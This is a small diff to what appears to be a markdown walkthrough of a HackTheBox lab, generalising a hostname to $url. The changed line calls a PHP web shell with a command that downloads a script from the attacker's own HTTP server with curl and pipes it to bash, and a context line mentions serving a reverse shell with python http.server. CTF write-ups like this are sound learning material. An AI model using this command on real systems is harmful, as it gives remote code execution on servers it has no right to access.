@@ -48,7 +48,7 @@ python3 -m http.server $port #Must be created at the same place where the revers
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-http://thetoppers.htb/shell.php?cmd=curl%20$myip:$portpy/$shfile|bash
+http://$url/shell.php?cmd=curl%20$myip:$portpy/$shfile|bash
 ```
 {% endcode %}
 
